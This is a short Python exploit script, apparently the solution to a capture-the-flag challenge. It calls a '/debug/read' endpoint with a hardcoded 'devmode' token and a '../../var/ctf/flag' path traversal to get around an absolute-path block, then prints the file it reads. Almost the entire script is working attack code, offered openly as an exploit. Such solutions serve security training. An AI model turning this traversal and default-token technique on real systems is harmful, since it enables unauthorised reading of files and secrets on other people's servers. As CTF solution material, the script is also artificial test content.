#!/usr/bin/env python3
import os
import sys
import requests


def build_target():
    if len(sys.argv) >= 3:
        host, port = sys.argv[1], int(sys.argv[2])
    else:
        host = os.environ.get("TARGET_HOST", "127.0.0.1")
        port = int(os.environ.get("TARGET_PORT", "5000"))
    return host, port


def run_exploit():
    host, port = build_target()
    # /debug/read blocks absolute paths; use traversal to reach flag
    rel_path = "../../var/ctf/flag"
    url = f"http://{host}:{port}/debug/read"
    params = {"token": "devmode", "path": rel_path}
    resp = requests.get(url, params=params, timeout=5)
    resp.raise_for_status()
    data = resp.json()
    flag = data.get("content", "").strip()
    print(flag)


if __name__ == "__main__":
    try:
        run_exploit()
    except Exception as exc:
        print(f"[!] exploit failed: {exc}", file=sys.stderr)
        sys.exit(1)
